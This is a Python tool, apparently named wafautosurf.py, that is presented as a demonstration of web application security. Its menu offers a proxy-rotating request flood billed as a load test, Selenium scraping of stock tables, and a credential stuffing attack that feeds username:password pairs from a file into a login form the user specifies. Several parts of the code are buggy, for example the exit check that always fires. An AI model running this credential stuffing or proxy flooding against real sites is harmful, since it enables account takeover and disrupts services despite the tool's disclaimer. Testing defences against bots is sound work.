import time, platform, sys, getopt, validators, random, threading, requests, os, csv
from selenium import webdriver 
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
from bs4 import BeautifulSoup
import pandas as pd

def main():
    url = ''
    trials = ''
    try:
        opts, arg = getopt.getopt(sys.argv[1:],"u:t:")
        for opt, arg in opts:
            if opt == '-u':
                url = str(arg)
            elif opt == '-t':
                try:
                    trials = int(arg)
                except ValueError:
                    print ("Enter a valid number for trials")
                return url, trials  #returns these variables to be used as inputs in other functions
    except getopt.GetoptError as e:
        print (e, 'python wafautosurf.py -u <Host URL> -t <No of Trials>')
        sys.exit(2)

def bot_broswing(url, trials):
    #Start automated browsing after validating the url
    if validators.url(url) and trials > 0:
        auto_surf(trials)
    else:
        print ("Check the input parameters for url and no. of trials")
        print ('python wafautosurf.py -u <Host URL> -t <No of Trials>')

def select_browser():
    pltOS = platform.system()

    try:
        '''Drivers downloaded from https://chromedriver.chromium.org/
        and placed inside ./drivers/ or .\drivers\.'''
        if pltOS == 'Darwin':
            # #Adding diversification to MacOS to choose randomly between Chrome and Firefox
            '''I was hopinh that something like the following would work for this:
            #############
            chrome = webdriver.Chrome(executable_path="./drivers/mac/chromedriver")
            firefox = webdriver.Chrome(executable_path="./drivers/mac/geckodriver")
            browser = random.choice(webdriver.Chrome(executable_path="./drivers/mac/chromedriver"), webdriver.Chrome(executable_path="./drivers/mac/geckodriver"))
            return browser
            #############
            But Selenium is painful to work with'''

            browser_name = random.choice(os.listdir("./drivers/mac"))
            print (f"Using {browser_name} Driver")
            driver_path = os.path.join("./drivers/mac/", browser_name)
            if browser_name == "geckodriver":
                browser = webdriver.Firefox(executable_path=f"{driver_path}")
                return browser
            else:
                browser = webdriver.Chrome(executable_path=f"{driver_path}")
                return browser

        elif pltOS == 'Linux':
            #This configuration allows linux server to natively run this program
            current_path = os.getcwd()
            driver_file = "/drivers/linux/chromedriver"
            file_path = current_path+driver_file
            option = webdriver.ChromeOptions()
            option.add_argument('--no-sandbox')
            option.add_argument('--disable-dev-shm-usage')
            option.add_argument('--headless')
            browser = webdriver.Chrome(executable_path=f"{file_path}",options=option)
            return browser

        elif pltOS == 'Windows':
            browser_name = random.choice(os.listdir(".\drivers\windows"))
            print (f"Using {browser_name} Driver")
            driver_path = os.path.join(".\drivers\Windows", browser_name)
            if browser_name == "geckodriver.exe":
                browser = webdriver.Firefox(executable_path=f"{driver_path}")
                return browser
            else:
                browser = webdriver.Chrome(executable_path=f"{driver_path}")
                return browser
    except:
        print ("Place driver for browser in drivers directory. This can be downloaded from https://chromedriver.chromium.org/")
        return


def login(username, password, login_url, username_pram, password_pram):
    try:
        auth_url = url+login_url
        driver = select_browser() #Call function to set browser driver
        driver.get (auth_url) #URL is defined in universal variable from main()
        #use credential dictionary file
        print (f'Initial URL {driver.current_url}')
        driver.find_element_by_name(f'{username_pram}').send_keys(username)
        element = driver.find_element_by_name(f'{password_pram}')
        element.send_keys(password)
        element.send_keys(Keys.RETURN)
        time.sleep(2)
        # print(f'***SUCCESSFUL*** Login: {driver.current_url}, {username}, {password}\n')
        print (f"Tried Username: {username} and Password: {password}\nRedirected to {driver.current_url}\n")
        driver.quit()

    except Exception as v:
        time.sleep(1)
        print (f"Tried {username} and {password}\n")

def scrape_data(url, ticker):
    driver = select_browser()
    driver.get(url)
    time.sleep(1)

# Find the first table on the page and start scraping - 
# not too sophisticated but should be good enough for illustration
    '''Start the browser, input a search, and look for tables
    In this example, we are using predefined list of tickers as the input criteria'''
    try:
        print (ticker)
        element = driver.find_element_by_name('search')
        element.send_keys(ticker)
        element.send_keys(Keys.RETURN)
        time.sleep(2)
        df = pd.read_html(driver.page_source)[0]
        df = (df.head(5))
        print (df)

        #The following saves the data to file - not necessary for illustration but nice to have
        file_path = "./data/scraped.csv"
        df = pd.DataFrame(df)
        df.to_csv(file_path, index=False, header=False)

    except NoSuchElementException as e:
        takescreenshot(driver)
        print (e, "**ALERT** 'Search' element could not be found. Check that the site is active")
        return breakpoint


def takescreenshot(driver):
    #Screenshots saved under ./data folder
    randnum = random.randint(0,20)
    screenshot_path = f'./data/screenshot{randnum}.png'
    driver.save_screenshot(screenshot_path)
    return


def scrape():
    search_list = ["GOOG", "AAPL", "TMUS", "T", "NKE"]
    for ticker in search_list:
        scrape_data(url, ticker)


def auto_surf(trials):
    n = 1
    while n <= trials:
        scrape()
        n += 1
        print (f'Round {n-1} of {trials} automated browsing of {url}')


def cred_spray():
    login_url = str(input("Enter the login url e.g. /login.jsp.  > "))
    username_pram = str(input("Enter the username parameter name > "))
    password_pram = str(input("Enter the password parameter name > "))
    #Grap credentials from specified file and use for padding
    with open('./data/accounts.txt', 'r') as f:
        for line in f:
            combo = line.strip('\r\n').split(':')
            username = combo[0]
            password = combo[1]
            '''use the credentials within the login function to 
            brute force with the credentials'''
            login(username, password, login_url, username_pram, password_pram)
        return

def load_test(num_of_requests):
    #Test code
    n = 0
    r = num_of_requests
    while n < r:
        proxy = pick_proxy()
        p = "http://"+proxy
        session = requests.Session()
        session.proxies = p
        request = session.get(url, verify = True)
        n += 1
        print (f'No of requests: {n}')
        # print (f"Response Code: {r.status_code},\n, Cookie: {r.cookies}, Using Proxy: {p}")

def load_threading():
    num_of_requests = int(input("Enter number of requests to send > "))
    run = threading.Thread(target=load_test(num_of_requests), args=(1,))
    run.start

def pick_proxy():
    proxies = csv.reader(open('./data/proxies.csv', 'r'))
    get_proxy = sum((proxy for proxy in proxies), [])
    proxy = random.choice(get_proxy)
    return (proxy)

def menu():
    menu=True
    while menu:
        print("""
        ** Caution: Still under development.
        This tool is not intended to be used for nefarious activities.
        The solve purpose of its inception is to measure show the value of in-depth web application security

        1. Basic Automated Load Test using Requests - simple load test using 'python requests'
        2. Scrape Content - scrapes tables
        3. Credential Stuffing Attack - #first configure dictionary in data/accounts.txt
        4. Exit/Quit
        """)

        menu=input("What would you like to do? ")
        if menu=="1":
            print("\n Basic Automated Load Test using Requests")
            load_threading()
        elif menu=="2":
            print("\n Launching Content Scraping")
            print (f'Content is now being scrapped from {url}')
            bot_broswing(url, trials)
        elif menu=="3":
            print("\n Credential Stuffing Attack")
            cred_spray()
        elif menu=="4" or "q":
            break
        elif menu == None:
            print("\n Not Valid Choice Try again")

if __name__ == "__main__":
    url, trials = main()
    menu()